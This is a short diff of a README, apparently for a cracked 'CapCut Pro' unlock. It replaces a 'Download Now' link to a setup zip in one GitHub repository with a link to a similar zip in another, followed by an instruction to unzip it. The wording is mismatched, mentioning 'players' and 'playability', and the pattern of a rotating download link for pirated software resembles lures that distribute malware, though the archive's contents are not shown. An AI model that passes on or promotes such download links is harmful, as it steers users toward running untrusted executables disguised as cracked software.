@@ -22,7 +22,7 @@ Perfect for players who want a refreshed look while maintaining smooth playabili
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Signalbrerhythm/CapCut-Pro-Unlock/releases/download/setup-2.11/setup-v2.11.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Orangenovapersonify/Cap-Cut-Pro/releases/download/setup-v2.33/setup-v2.33.zip)
 Download the latest version using the button below.
 
 Unzip the archive to a separate folder.
